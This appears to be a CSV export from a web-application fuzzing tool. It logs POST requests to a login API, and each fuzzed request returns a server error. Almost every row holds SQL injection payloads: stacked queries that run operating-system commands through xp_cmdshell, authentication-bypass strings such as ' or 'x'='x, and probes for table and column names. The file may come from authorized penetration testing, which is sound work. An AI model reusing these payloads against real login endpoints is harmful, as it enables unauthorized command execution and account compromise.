Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Sat Jan 11 16:58:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,401,Unauthorized,128,632,54,585,33,Medium,,[]
7,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,328,632,92,772,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, ' and 1=0) union all]"
2,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,333,632,75,772,79,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, a' ]"
5,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,350,632,73,772,79,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, @]"
6,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,399,632,73,772,79,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, ?]"
9,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,97,594,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, x' and userid is NULL; --]"
10,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,96,594,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, x' and email is NULL; --]"
11,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,91,594,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, anything' or 'x'='x]"
12,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,141,633,115,594,79,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, x' and 1=(select count(*) from tabname); --]"
14,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,99,594,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, x' or full_name like '%bob%]"
